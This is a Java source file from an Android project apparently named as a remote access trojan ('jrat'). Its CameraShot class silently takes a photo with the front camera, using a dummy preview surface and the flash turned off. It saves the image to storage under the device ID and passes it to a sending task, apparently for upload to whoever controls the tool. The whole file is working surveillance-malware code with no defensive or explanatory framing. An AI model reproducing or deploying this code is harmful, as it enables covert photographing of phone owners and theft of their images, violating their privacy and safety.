package com.julioxus.jrat;

import android.content.Context;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Environment;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

/**
 * Created by enpi on 03/06/2016.
 */
public class CameraShot {

    private Camera myCamera;
    private String android_id;
    private String fileName;
    private Context context;


    public CameraShot(Context context, String android_id){
        this.context = context;
        this.android_id = android_id;
        myCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
    }

    public void takePhoto() {

        try {
            myCamera.setPreviewTexture(new SurfaceTexture(1000));
        } catch (IOException e) {
            e.printStackTrace();
        }

        Camera.Parameters parameters = myCamera.getParameters();
        parameters.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
        parameters.setPictureFormat(ImageFormat.JPEG);
        myCamera.setParameters(parameters);

        myCamera.startPreview();
        myCamera.takePicture(null, null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                savePhoto(data);
            }
        });

        Log.d("CameraShot", "Tomando foto!");
    }

    public void savePhoto(byte[] data){
        try {
            fileName = Environment.getExternalStorageDirectory().getAbsolutePath();
            fileName += "/" + android_id +"-CameraShot.jpg";
            File file = new File(fileName);
            FileOutputStream out = new FileOutputStream(file);

            out.write(data);
            out.flush();
            out.close();

            new SendCameraShotAsyncTask(context, android_id, fileName).execute();

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e){
            e.printStackTrace();
        } catch (Exception e){
            e.printStackTrace();
        }finally {
            myCamera.stopPreview();
            myCamera.release();
            myCamera = null;
        }
    }
}
